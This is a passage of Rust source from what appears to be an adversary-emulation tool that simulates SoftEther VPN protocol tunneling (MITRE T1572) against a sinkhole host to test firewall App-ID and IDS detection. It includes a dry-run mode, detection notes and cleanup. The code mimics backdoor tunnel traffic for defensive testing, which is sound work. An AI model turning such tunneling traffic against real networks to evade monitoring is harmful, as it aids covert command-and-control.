                writeln!(log, "  -> ERROR: {e}").unwrap();
                warn!("[T1572-SOFTETHER] session {session_num} {round_name} error: {e}");
            }
            Err(_) => {
                writeln!(log, "  -> TIMEOUT").unwrap();
                warn!(
                    "[T1572-SOFTETHER] session {session_num} {round_name} timed out after {}s",
                    timeout_secs + 2
                );
            }
        }
    }
    ok
}

pub struct SuspiciousDomainsSoftEther {}

#[async_trait]
impl AttackTechnique for SuspiciousDomainsSoftEther {
    fn info(&self) -> Technique {
        Technique {
            id: "T1572-SOFTETHER".to_string(),
            name: "Protocol Tunneling - SoftEther / PacketiX VPN Simulation".to_string(),
            description: format!(
                "Simulates {SE_SESSIONS} SoftEther VPN (PacketiX VPN) sessions over HTTPS on port \
                 {SE_PORT}, each comprising a three-round binary PACK handshake (hello → login → \
                 getconfig) against the sinkhole at {SE_HOST}:{SE_PORT}. \
                 Total: {} HTTPS POST requests (~{}x SharePoint exfil volume). \
                 PA-440 App-ID classifies the bidirectional TLS + HTTP-PACK flow as \
                 'softether-vpn' / 'PacketiX VPN'. MITRE T1572 — Protocol Tunneling. \
                 Reference: Unit42 CL-STA-1062 / TinyRCT backdoor; \
                 SoftEther src/Cedar/Http.c + src/Mayaqua/Pack.c.",
                SE_SESSIONS * 3,
                SE_SESSIONS * 3 / 10 + if !(SE_SESSIONS * 3).is_multiple_of(10) { 1 } else { 0 }
            ),
            category: "COMMAND_AND_CONTROL".to_string(),
            parameters: vec![
                TechniqueParameter {
                    name: "log_file".to_string(),
                    description: "Path to save connection log".to_string(),
                    required: false,
                    default: Some("/tmp/signalbench_t1572_softether.log".to_string()),
                },
                TechniqueParameter {
                    name: "timeout".to_string(),
                    description: "Per-request timeout in seconds".to_string(),
                    required: false,
                    default: Some("5".to_string()),
                },
            ],
            detection: format!(
                "PA-440 App-ID: 'softether-vpn' / 'PacketiX VPN' on port {SE_PORT}. \
                 IDS: HTTPS POST to /vpnsvc/connect.cgi with 4-byte BE element-count prefix \
                 in the body (SoftEther PACK format). \
                 Behavioural: repeated HTTPS connections to port {SE_PORT} from a non-VPN process."
            ),
            cleanup_support: true,
            platforms: vec!["Linux".to_string()],
            permissions: vec!["user".to_string()],
            voltron_only: false,
        }
    }

    fn execute<'a>(&'a self, config: &'a TechniqueConfig, dry_run: bool) -> ExecuteFuture<'a> {
        Box::pin(async move {
            let log_file = config
                .parameters
                .get("log_file")
                .cloned()
                .unwrap_or_else(|| "/tmp/signalbench_t1572_softether.log".to_string());
            let timeout = config
                .parameters
                .get("timeout")
                .and_then(|t| t.parse::<u32>().ok())
                .unwrap_or(5);

            let sinkhole_ip = crate::techniques::resolve_sinkhole_ip().await;

            if dry_run {
                info!(
                    "[DRY RUN] T1572-SOFTETHER: Would run {SE_SESSIONS} SoftEther VPN sessions \
                     to {SE_HOST}:{SE_PORT} (sinkhole {sinkhole_ip}) — {} HTTPS POST requests",
                    SE_SESSIONS * 3
                );
                return Ok(SimulationResult {
                    technique_id: "T1572-SOFTETHER".to_string(),
                    success: true,
                    message: format!(
                        "DRY RUN: Would send {} HTTPS POSTs to {SE_HOST}:{SE_PORT} \
                         ({SE_SESSIONS} SoftEther sessions, sinkhole {sinkhole_ip})",
                        SE_SESSIONS * 3
                    ),
                    artifacts: vec![log_file],
                    cleanup_required: false,
                });
            }

            let sinkhole_addr: std::net::SocketAddr =
                format!("{sinkhole_ip}:{SE_PORT}").parse().map_err(|e| {
                    format!("Failed to parse sinkhole address {sinkhole_ip}:{SE_PORT}: {e}")
                })?;

            let client = reqwest::Client::builder()
                .danger_accept_invalid_certs(true)
                .resolve(SE_HOST, sinkhole_addr)
                .timeout(Duration::from_secs(u64::from(timeout) + 2))
                .build()
                .map_err(|e| format!("Failed to build HTTP client: {e}"))?;

            let mut log = File::create(&log_file)
                .map_err(|e| format!("Failed to create log file: {e}"))?;
            writeln!(log, "# SignalBench T1572-SOFTETHER - SoftEther VPN Protocol Tunneling").unwrap();
            writeln!(log, "# Timestamp: {}", chrono::Local::now()).unwrap();
            writeln!(log, "# Sinkhole:  {sinkhole_ip} (resolved from sinkhole.signalbench.sigre.xyz)").unwrap();
            writeln!(log, "# Target:    https://{SE_HOST}:{SE_PORT}{SE_PATH}").unwrap();
            writeln!(log, "# Sessions:  {SE_SESSIONS} x 3 rounds = {} HTTPS POST requests", SE_SESSIONS * 3).unwrap();
            writeln!(log, "# --------------------------------------------------------\n").unwrap();

            println!("\n[T1572-SOFTETHER] SoftEther / PacketiX VPN Protocol Tunneling");
            println!("{}", "-".repeat(60));
            println!(
                "  Target:   https://{SE_HOST}:{SE_PORT}{SE_PATH}"
            );
            println!("  Sinkhole: {sinkhole_ip}");
            println!(
                "  Sessions: {SE_SESSIONS} × (hello + login + getconfig) = {} HTTPS POSTs",
                SE_SESSIONS * 3
            );
            println!("{}", "-".repeat(60));

            let mut total_ok = 0u32;
            for s in 1..=SE_SESSIONS {
                print!("  Session {s}/{SE_SESSIONS}  (hello/login/getconfig) ... ");
                std::io::stdout().flush().ok();
                let ok = softether_vpn_session(&client, s, &mut log, timeout).await;
                total_ok += ok;
                println!("{ok}/3 ok");
                writeln!(log, "[session {s}] result: {ok}/3 exchanges ok").unwrap();
                if s < SE_SESSIONS {
                    sleep(Duration::from_millis(200)).await;
                }
            }

            println!("{}", "-".repeat(60));
            println!(
                "  Total: {total_ok}/{} exchanges ok",
                SE_SESSIONS * 3
            );
            info!(
                "[T1572-SOFTETHER] Complete: {total_ok}/{} exchanges to {SE_HOST}:{SE_PORT}",
                SE_SESSIONS * 3
            );

            Ok(SimulationResult {
                technique_id: "T1572-SOFTETHER".to_string(),
                success: true,
                message: format!(
                    "SoftEther VPN simulation: {total_ok}/{} HTTPS POSTs to \
                     https://{SE_HOST}:{SE_PORT}{SE_PATH} (sinkhole {sinkhole_ip})",
                    SE_SESSIONS * 3
                ),
                artifacts: vec![log_file],
                cleanup_required: true,
            })
        })
    }

    fn cleanup<'a>(&'a self, artifacts: &'a [String]) -> CleanupFuture<'a> {
        Box::pin(async move {
            for artifact in artifacts {
                if Path::new(artifact).exists() {
                    if let Err(e) = fs::remove_file(artifact) {
                        warn!("[T1572-SOFTETHER] Failed to remove {artifact}: {e}");
                    } else {
                        debug!("[T1572-SOFTETHER] Removed: {artifact}");
                    }
                }
            }
            info!("[T1572-SOFTETHER] Cleanup complete");
            Ok(())
        })
    }
}
